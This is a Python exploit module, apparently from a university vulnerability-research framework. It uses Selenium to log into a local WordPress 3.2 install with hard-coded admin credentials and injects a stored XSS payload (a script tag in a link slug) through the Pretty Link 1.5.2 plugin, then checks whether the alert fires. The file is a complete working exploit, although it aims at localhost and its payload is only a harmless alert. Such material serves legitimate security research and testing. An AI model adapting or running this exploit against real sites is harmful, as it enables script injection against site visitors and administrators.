
# Copyright 2013 University of Maryland.  All rights reserved.
# Use of this source code is governed by a BSD-style
# license that can be found in the LICENSE.TXT file.

import framework  
import time
from selenium.common.exceptions import NoAlertPresentException
  
class Exploit (framework.Exploit):
    attributes = {'Name' : "OSVDB_77582",
                  'Description' : "Creates a post containing a XSS payload.",
                  'References' : [['OSVDB','77582'],['http://www.osvdb.org/show/osvdb/77582']],
                  'Target' : "Wordpress 3.2",
                  'TargetLicense' : '',
                  'Type' : "XSS",
                  'VulWikiPage' : "http://seamster.cs.umd.edu/vulwiki/index.php/OSVDB-77582",
                  'Plugin' : "Pretty Link 1.5.2",
                  'Privileged' : True 
                  }
                    
    def __init__(self, visible=False):
        framework.Exploit.__init__(self, visible)
        self.verified = False
        return

    def exploit(self):
        payload = "<script>prompt(\"Attack!!\")</script>"
        driver = self.create_selenium_driver()
        driver.get("http://localhost/wordpress")
        self.logger.info("Page opened successfully: %s", driver.title)
        self.logger.info("uploading payload: %s", payload)
        driver.get("http://localhost/wordpress/wp-login.php")
        driver.find_element_by_id("user_login").clear()
        driver.find_element_by_id("user_login").send_keys(" wpadmin")                                                                                            
        driver.find_element_by_id("user_pass").clear()   
        driver.find_element_by_id("user_pass").send_keys("wpadminpw21")
        driver.find_element_by_id("wp-submit").send_keys("\n")
#        driver.get("http://127.0.0.1/wordpress/wp-admin/options-permalink.php")
#        driver.get_element(by_xpath="//*[@id='permalink_structure']").send_keys("/%%year%%/%%monthnum%%/%%day%%/%%postname%%/")
#        driver.get_element(by_id="submit").click()                                                                                                                
        driver.get("http://127.0.0.1/wordpress/wp-admin/admin.php?page=pretty-link/prli-add-link.php")
        url_element = driver.get_element(by_xpath="//textarea[@name='url']")
        url_element.clear()
        url_element.send_keys("http://127.0.0.1/wordpress/wp-admin")
        slug_element = driver.get_element(by_xpath="//input[@name='slug']")
        slug_element.clear()
        slug_element.send_keys("<script>alert(\"Attack\")</script>")
        driver.get_element(by_xpath="//input[@value='Create']").click()
        
        alert = None
        tries = 5
        while tries:
            alert = driver.switch_to_alert()
            try:
                text = alert.text
                self.verified = True
                break
            except NoAlertPresentException:
                tries -= 1
                time.sleep(1)
                

        if self.visible:
            time.sleep(10)

        driver.cleanup()
        return                

    def verify(self):
        return self.verified
